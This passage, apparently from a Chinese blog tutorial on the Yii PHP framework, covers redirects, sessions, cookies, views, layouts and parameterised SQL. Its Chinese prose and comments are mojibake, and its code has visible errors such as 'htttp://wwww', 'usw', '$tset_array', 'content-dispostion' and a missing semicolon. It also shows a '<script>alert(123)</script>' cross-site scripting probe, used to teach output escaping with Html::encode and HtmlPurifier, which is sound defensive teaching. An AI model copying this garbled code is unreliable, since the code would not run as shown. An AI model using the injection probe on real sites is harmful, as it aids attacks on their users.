class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// $request = \YII::$app-&gt;request;//å…¨å±€ç±»</span></span></span><br><span class="line"><span class="php">    <span class="comment">// echo $request-&gt;get('id',20); //å½“æ²¡æœ‰è¿›è¡Œgetæ—¶ é»˜è®¤ä¸º20</span></span></span><br><span class="line"><span class="php">    $res =  \YII::$app-&gt;response;</span></span><br><span class="line"><span class="php">    <span class="comment">// æ·»åŠ å¤´éƒ¨ä¿¡æ¯</span></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'pragma'</span>,<span class="string">'no-cache'</span>);</span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;set(<span class="string">'pragma'</span>,<span class="string">'no-cache'</span>);</span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;remove(<span class="string">'pragma'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// å®ç°è·³è½¬</span></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'location'</span>,<span class="string">'http://www.baidu.com'</span>);</span></span><br><span class="line"><span class="php">    <span class="comment">// æœ‰ä¸“é—¨è·³è½¬æ–¹æ³•</span></span></span><br><span class="line"><span class="php">    <span class="keyword">$this</span>-&gt;redirect(<span class="string">'htttp://wwww.baidu.com'</span>,<span class="number">302</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//è¿›è¡Œæ–‡ä»¶ä¸‹è½½</span></span></span><br><span class="line"><span class="php">    <span class="comment">// è®¿é—®æ–‡ä»¶é»˜è®¤åœ¨ WEBç›®å½•ä¸‹</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $res-&gt;headers-&gt;add(<span class="string">'content-dispostion'</span>,<span class="string">'attachment; filename="a.jpg"'</span>)</span></span><br><span class="line"><span class="php">    $res-&gt;sendFile(<span class="string">'./robots.txt'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="YII-æ“ä½œSession"><a href="#YII-æ“ä½œSession" class="headerlink" title="YII æ“ä½œSession"></a>YII æ“ä½œSession</h3><p>session çš„å­˜å‚¨è·¯å¾„å¯åœ¨ php.ini ä¸­æ‰¾åˆ°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $session = \YII::$app-&gt;session;</span></span><br><span class="line"><span class="php">    $session-&gt;open();   <span class="comment">//ç”¨äºå¼€å¯session</span></span></span><br><span class="line"><span class="php">    <span class="comment">// if($session-&gt;isActive)&#123;  //ç”¨äºæ£€æµ‹ session æ˜¯å¦å¼€å¯</span></span></span><br><span class="line"><span class="php">    <span class="comment">//   echo "session is active";</span></span></span><br><span class="line"><span class="php">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $session-&gt;set(<span class="string">'user'</span>,<span class="string">'å¤åˆ©'</span>);   <span class="comment">//ç”¨äºè®¾ç½® session</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0l8xjhx9jj311b0ekdhe.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $session-&gt;get(<span class="string">'user'</span>);  <span class="comment">// è·å¾—sessionå€¼</span></span><br><span class="line"></span><br><span class="line">$session-&gt;remove(<span class="string">'user'</span>);</span><br><span class="line"></span><br><span class="line">$session[<span class="string">'user'</span>] = <span class="string">'å¼ ä¸‰'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>($session[<span class="string">'user'</span>]);</span><br></pre></td></tr></table></figure><h3 id="YII-æ“ä½œCookie"><a href="#YII-æ“ä½œCookie" class="headerlink" title="YII æ“ä½œCookie"></a>YII æ“ä½œCookie</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $cookies = \YII::$app-&gt;response-&gt;cookies;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $cookie_data = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'user'</span>,<span class="string">'value'</span>=&gt;<span class="string">'zhangsi'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $cookies-&gt;add(<span class="keyword">new</span> cookie($cookie_data));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="View-å±‚"><a href="#View-å±‚" class="headerlink" title="View å±‚"></a>View å±‚</h2><p>è¦è®¿é—®è§†å›¾æ–‡ä»¶  éœ€è¦æŠŠè§†å›¾æ–‡ä»¶æ”¾åˆ°ä¸æ§åˆ¶å™¨åç›¸åŒçš„æ–‡ä»¶å¤¹ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>.\basic\views\Hello.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;å°å§å§&lt;/h1&gt;"</span>;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a><br>æˆåŠŸå¾—åˆ°è§†å›¾æ–‡ä»¶</p><p>å½“è¦åœ¨viewæ–‡ä»¶ä¸­ä½¿ç”¨æ§åˆ¶å™¨ä¸­çš„çš„å˜é‡æ—¶  éœ€è¦æŠŠæ•°æ®æ”¾å…¥æ•°ç»„å½“ä¸­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $hello_str = <span class="string">'å°å“¥å“¥'</span>;</span></span><br><span class="line"><span class="php">    $test_array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//åˆ›å»ºä¸€ä¸ªæ•°ç»„ å­˜æ”¾æ•°æ®</span></span></span><br><span class="line"><span class="php">    $array = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// å°†æ•°æ®æ”¾å…¥æ•°ç»„</span></span></span><br><span class="line"><span class="php">    $data[<span class="string">'view_str'</span>] = $hello_str;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $data[<span class="string">'view_array'</span>] = $tset_array;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>,$data);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_str;<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_array[<span class="number">0</span>];<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“$hello_str  å¯æ§ ä¼šé€ æˆæ¶æ„ä»£ç æ”»å‡»  å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªæ–¹æ³•è¿›è¡Œè¿‡æ»¤</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hello_str = 'å°å§å§<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(123)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">Html</span>;  <span class="comment">// è¿™ä¸ªç±»ä¼šå°†script è½¬ç§»</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">HtmlPurifier</span>;   <span class="comment">//è¿™ä¸ªç±»ä¼šå°†script ç›´æ¥è¿‡æ»¤æ‰</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=Html::encode($view_str);<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=HtmlPurifier::process($view_str);<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lbuqssloj30kt06eq33.jpg" alt=""></p><p>ä¼˜åŒ–å¸ƒå±€<br>å½“åœ¨helloæ–‡ä»¶å¤¹ä¸­æœ‰about.php index.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello about</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    hello index</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯è§ é™¤äº† hello about hello index å…¶ä»–çš„éƒ½æ˜¾å¾— å¤šä½™<br>æ¥ä¸‹æ¥æŠŠ å¤šä½™çš„ä»£ç  æ”¾åœ¨basic\views\layouts æ–‡ä»¶å¤¹ä¸‹ å¹¶åˆ›å»ºä¸€ä¸ªcommon.php<br>å†…å®¹ä¸º</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello common<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?</span>=$content;<span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>index.phpå’Œabout.phpç›´æ¥å†™hello index  hello about</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">cookie</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $layout = <span class="string">'common'</span>;  <span class="comment">//æŒ‡å®šæ¨¡æ¿</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">      <span class="comment">// è°ƒç”¨renderæ–¹æ³•</span></span></span><br><span class="line"><span class="php">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcgg7rg2j30dm04xjr9.jpg" alt=""></p><p>å¦‚æœæƒ³åœ¨index.phpè§†å›¾è®¿é—®about.phpè§†å›¾æ–‡ä»¶<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcp2erquj30qv0ba3zf.jpg" alt=""></p><p>å¦‚æœè®¿é—®å¦ä¸€ä¸ªè§†å›¾æ–‡ä»¶çš„å˜é‡<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0lcyp5qtaj30yw0dmgnb.jpg" alt=""><br>YIæ“ä½œæ•°æ®å—<br>å½“ä¸æƒ³æ˜¾ç¤ºæ¨¡æ¿ä¸­çš„ä¸€äº›å†…å®¹æ—¶ ç”¨<br>$this-&gt;endBlock();<br>æ¥å®šä¹‰ä¸€ä¸ªhtmlä»£ç å—ï¼Œè¯¥ä»£ç å—å¯åœ¨layoutæ–‡ä»¶ä¸­å¼•ç”¨ï¼Œ<br>$this-&gt;blocks[â€˜block_nameâ€™]</p><h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><h3 id="YII-æ•°æ®æ¨¡å‹"><a href="#YII-æ•°æ®æ¨¡å‹" class="headerlink" title="YII æ•°æ®æ¨¡å‹"></a>YII æ•°æ®æ¨¡å‹</h3><p>å¯¹æ•°æ®åº“è¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œæ•°æ®åº“<br>å®ç°åˆ›å»ºæ•°æ®åº“yii è¡¨test  tittle id å­—æ®µ</p><p>åœ¨configæ–‡ä»¶å¤¹ä¸­çš„db.phpé…ç½®å¥½æ•°æ®åº“</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $sql = <span class="string">'select * from test where id=:id'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// é¦–å…ˆäº§ç”Ÿçš„æ¯ä¸€æ¡è®°å½•è¢«æ”¾åœ¨ä¸€ä¸ªå¯¹è±¡é‡Œé¢ æ¯ä¸€ä¸ªå¯¹è±¡è¢«æ”¾åœ¨æ•°ç»„é‡Œé¢</span></span></span><br><span class="line"><span class="php">    $results = Test::findBySql($sql,<span class="keyword">array</span>(<span class="string">':id'</span>=&gt;<span class="number">1</span>))-&gt;all();    <span class="comment">// åˆ©ç”¨å ä½ç¬¦ å¯ä»¥é˜²æ­¢sqlæ³¨å…¥ æ— è®ºæ‹¼æ¥çš„æ˜¯ä»€ä¹ˆ éƒ½ä¼šå½“æˆä¸€ä¸ªå­—ç¬¦</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·çœ‹èµ·æ¥ä»£ç æœ‰ç‚¹å¤š  å¯ä»¥ç”¨find()æ–¹æ³•  å°†æŸ¥è¯¢æ¡ä»¶æ”¾åˆ°æ•°æ®ä¸­å»</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// $sql = 'select * from test where id=:id';</span></span></span><br><span class="line"><span class="php">    <span class="comment">//</span></span></span><br><span class="line"><span class="php">    <span class="comment">// // é¦–å…ˆäº§ç”Ÿçš„æ¯ä¸€æ¡è®°å½•è¢«æ”¾åœ¨ä¸€ä¸ªå¯¹è±¡é‡Œé¢ æ¯ä¸€ä¸ªå¯¹è±¡è¢«æ”¾åœ¨æ•°ç»„é‡Œé¢</span></span></span><br><span class="line"><span class="php">    